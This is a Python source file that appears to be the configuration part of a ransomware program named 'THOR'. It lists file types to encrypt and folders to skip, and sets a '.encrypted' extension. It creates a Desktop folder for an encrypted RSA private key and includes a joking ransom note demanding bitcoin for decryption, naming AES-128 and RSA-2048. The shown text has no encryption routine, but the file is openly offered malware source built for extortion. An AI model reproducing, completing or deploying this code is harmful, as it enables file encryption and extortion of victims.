import os
from getpass import getuser


# Files
filetypes = [
    '.7z', '.ai', '.asp', '.aspx', '.c', '.cpp', '.cs', '.css', '.csv',
    '.db', '.doc', '.docx', '.go', '.h', '.hpp', '.htm', '.html', '.ico', '.jpeg',
    '.jpg', '.js', '.json', '.md', '.mp3', '.mp4', '.pdf', '.php', '.png', '.ppt', '.pptx', '.ps1',
    '.psd', '.py', '.rar', '.rb', '.rtf', '.sql', '.sqlite', '.sqlite3', '.svg',
    '.ts', '.txt', '.vb', '.vmx', '.wmv', '.xls', '.xlsx', '.zip'
]

exclude = [
    'appdata',
    'node_modules',
    'cmder',
    'go',
    'gocode'
    'python'
    'debug',
    'site-packages'
]

encrypted_extension = '.encrypted'

desktop = os.path.join(
    os.path.abspath(os.path.sep), 'Users', getuser(
    ), 'Desktop'
)

THOR_DIR = os.path.join(desktop, 'THOR_DIR')
ENCRYPTED_RSA_PRIVATE_KEY = os.path.join(THOR_DIR, 'encrypted_private.ekey')

README_THOR_FOLDER = os.path.join(THOR_DIR, 'README.txt')
README_NAME = os.path.join(desktop, 'README.txt')

# check if key dir exists
if not os.path.exists(THOR_DIR):
    os.mkdir(THOR_DIR)

README_CONTENT = '''
You have been infected; now what?\n

Well for starters, relax; take a deep breath, everything will be fine.\n

Bro, my phone has been acting up lately and I'm dirt broke. I have money but not enough for\n
a brand new iPhone; and there is noway I'm buying an Android; I don't want people to think I'm too broke for an iPhone\n

So, can you help a brother out? Like deadass bro, I really need a new phone; I hate my current phone.\n
Tell you what bro, you send me some bitcoin(BTC) and I'll decrypt your files. Just send me like ${0} worth of BTC thou;\n
They say money changes you, so I don't want too much of it.\n\n

My BTC wallet address is {1}.\n
You need a BTC wallet in order to send me some BTC. Go watch a YouTube video on how to create a BTC wallet or something.\n
Also bro, no hard feelings; it's just that money is tight at the moment and I got nowhere else to turn to.\n\n

FAQ:
    Q: Why?
    A: My phone is acting up and there is noway I'm using an Android; I rather have no phone than to have an Android.\n

    Q: Do you accept Paypal?
    A: No, Paypal fees are too high.\n

    Q: Do you accept Western Union?
    A: No, it's too complicated. I think; idk.\n

    Q: Can Google help me decrypt my files?
    A: Nope; not even the U.S. government can. I have the key, meaning only I can.\n

    Q: What is your favorite color?
    A: Blue.\n

    Q: What encryption methods are you using?
    A: AES-128 for symmetric encryption and RSA-2048 for asymmetric encryption.\n

    Q: Why don't you get up off of your lazy ass and get yourself a job instead of begging people for money?
    A: Keep talking like you're my dad and your files will stay encrypted till the end of time.\n

    Q: Is light a wave or a particle?
    A: Both; I think; idk. Ever heard of the double-slit experiment?\n

    Q: My friend is a programmer, can he decrypt my files?
    A: Again, noone but me can decrypt your files.\n

    Q: What is the Heisenberg uncertainty principle?
    A: Idk, go watch a YouTube video on it or something.\n

    Q: What your favorite anime?
    A: I abhor anime.\n
'''
